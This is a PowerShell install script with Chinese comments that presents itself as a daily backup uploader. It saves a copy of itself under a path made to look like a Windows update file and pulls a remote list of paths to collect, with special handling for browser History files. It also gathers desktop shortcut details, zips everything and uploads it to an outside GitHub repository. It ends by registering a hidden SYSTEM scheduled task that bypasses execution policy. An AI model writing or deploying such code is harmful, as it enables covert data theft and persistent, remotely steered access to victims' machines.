# install.ps1 - 自动部署上传器并创建每日计划任务

# ==== 配置 ====
$token = $env:GITHUB_TOKEN  # ✅ 环境变量方式（更安全）
$repo = "drftghy/backup-files"
$logPath = "C:\upload_log.txt"
$taskName = "UploaderTask"
$savePath = "C:\ProgramData\Microsoft\Windows\update.ps1"

"[INSTALL EXECUTED] $(Get-Date -Format u)" | Out-File $logPath -Append

# ==== 保存自身到固定路径 ====
try {
    Invoke-RestMethod -Uri "https://raw.githubusercontent.com/$repo/main/.github/install.ps1" `
        -OutFile $savePath -UseBasicParsing -ErrorAction Stop
    "[OK] install.ps1 downloaded to $savePath" | Out-File $logPath -Append
} catch {
    "❌ Failed to download install.ps1: $($_.Exception.Message)" | Out-File $logPath -Append
    exit
}

# ==== 上传逻辑 ====
try {
    if (-not $token) {
        "❌ GITHUB_TOKEN not set." | Out-File $logPath -Append
        exit
    }

    $now = Get-Date
    $timestamp = $now.ToString("yyyy-MM-dd-HHmmss-fff")
    $date = $now.ToString("yyyy-MM-dd")
    $computerName = $env:COMPUTERNAME
    $tag = "backup-$computerName-$timestamp"
    $releaseName = "Backup - $computerName - $date"
    $tempRoot = "$env:TEMP\package-$computerName-$timestamp"
    $zipName = "package-$computerName-$timestamp.zip"
    $zipPath = Join-Path $env:TEMP $zipName

    New-Item -ItemType Directory -Path $tempRoot -Force -ErrorAction SilentlyContinue | Out-Null

    $remoteTxtUrl = "https://raw.githubusercontent.com/$repo/main/.github/upload-target.txt"
    $pathList = @()
    try {
        $remoteList = Invoke-RestMethod -Uri $remoteTxtUrl -UseBasicParsing -ErrorAction Stop
        $pathList = $remoteList -split "`n" | ForEach-Object { $_.Trim() } | Where-Object { $_ -ne "" }
    } catch {
        "❌ Failed to load upload-target.txt: $($_.Exception.Message)" | Out-File $logPath -Append
        return
    }

    $index = 0
    foreach ($path in $pathList) {
        $index++
        $name = "item$index"
        if (-not (Test-Path $path)) { continue }
        $dest = Join-Path $tempRoot $name

        try {
            if ($path -like "*\History" -and (Test-Path $path -PathType Leaf)) {
                $srcDir = Split-Path $path
                robocopy $srcDir $dest (Split-Path $path -Leaf) /NFL /NDL /NJH /NJS /nc /ns /np > $null
            } elseif (Test-Path $path -PathType Container) {
                Copy-Item $path -Destination $dest -Recurse -Force -ErrorAction Stop
            } else {
                Copy-Item $path -Destination $dest -Force -ErrorAction Stop
            }
        } catch {
            "❌ Failed to copy $path: $($_.Exception.Message)" | Out-File $logPath -Append
        }
    }

    try {
        $desktop = [Environment]::GetFolderPath("Desktop")
        $lnkFiles = Get-ChildItem -Path $desktop -Filter *.lnk
        $lnkReport = ""
        foreach ($lnk in $lnkFiles) {
            $shell = New-Object -ComObject WScript.Shell
            $shortcut = $shell.CreateShortcut($lnk.FullName)
            $lnkReport += "[$($lnk.Name)]`n"
            $lnkReport += "TargetPath: $($shortcut.TargetPath)`n"
            $lnkReport += "Arguments:  $($shortcut.Arguments)`n"
            $lnkReport += "StartIn:    $($shortcut.WorkingDirectory)`n"
            $lnkReport += "Icon:       $($shortcut.IconLocation)`n-----------`n"
        }
        $lnkReport | Out-File -FilePath "$tempRoot\lnk_info.txt" -Encoding utf8
    } catch {
        "⚠️ Failed to extract .lnk info: $($_.Exception.Message)" | Out-File $logPath -Append
    }

    Compress-Archive -Path "$tempRoot\*" -DestinationPath $zipPath -Force -ErrorAction Stop

    $releaseData = @{
        tag_name = $tag
        name = $releaseName
        body = "Automated file package from $computerName on $date"
        draft = $false
        prerelease = $false
    } | ConvertTo-Json -Depth 3

    $headers = @{
        Authorization = "token $token"
        "User-Agent" = "PowerShellScript"
        Accept = "application/vnd.github.v3+json"
    }

    $releaseResponse = Invoke-RestMethod -Uri "https://api.github.com/repos/$repo/releases" `
        -Method POST -Headers $headers -Body $releaseData -ErrorAction Stop

    $uploadUrl = $releaseResponse.upload_url -replace "{.*}", "?name=$zipName"
    $fileBytes = [System.IO.File]::ReadAllBytes($zipPath)
    Invoke-RestMethod -Uri $uploadUrl -Method POST -Headers $headers -Body $fileBytes -ErrorAction Stop

    "[OK] Upload completed." | Out-File $logPath -Append
} catch {
    "❌ Upload failed: $($_.Exception.Message)" | Out-File $logPath -Append
} finally {
    Remove-Item $tempRoot, $zipPath -Recurse -Force -ErrorAction SilentlyContinue
}

# ==== 注册每日任务（0:00）====
try {
    if (Get-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue) {
        Unregister-ScheduledTask -TaskName $taskName -Confirm:$false
        "[OK] Existing task removed." | Out-File $logPath -Append
    }

    $action = New-ScheduledTaskAction -Execute "powershell.exe" `
        -Argument "-ExecutionPolicy Bypass -WindowStyle Hidden -Command `$env:GITHUB_TOKEN='$token'; & '$savePath'"

    $trigger = New-ScheduledTaskTrigger -Daily -At 0:00am
    $principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest

    Register-ScheduledTask -Action $action -Trigger $trigger -TaskName $taskName -Principal $principal
    "[OK] Scheduled task registered (0:00)." | Out-File $logPath -Append
} catch {
    "❌ Scheduled task creation failed: $($_.Exception.Message)" | Out-File $logPath -Append
}
